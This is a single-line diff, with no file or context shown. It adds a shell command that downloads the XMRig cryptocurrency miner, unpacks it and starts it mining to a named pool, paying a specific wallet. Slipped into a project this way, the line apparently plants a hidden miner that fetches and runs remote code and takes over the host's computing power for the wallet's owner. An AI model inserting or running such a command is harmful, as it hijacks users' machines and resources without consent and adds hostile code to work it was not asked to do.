@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u ETH:0xe26Ab0cA8399820613075c682D946FF0a7C85Ccf.unmineable_worker_zwurpo -p x
